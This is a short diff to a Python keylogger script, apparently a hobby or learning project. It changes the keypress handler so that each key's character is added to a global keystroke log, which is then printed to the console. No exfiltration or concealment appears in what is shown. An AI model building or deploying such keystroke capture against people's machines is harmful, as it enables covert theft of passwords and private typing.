@@ -9,7 +9,7 @@ log = "" #init var for storing keystrokes
 
 def process_keypress(key):
     global log #to define global variables
-    log = log + str(key) #key is of type KeyType and cannot be concat'ed
+    log = log + str(key.char) #key is of type KeyType and cannot be concat'ed
     #print(key)
     print(log)
     
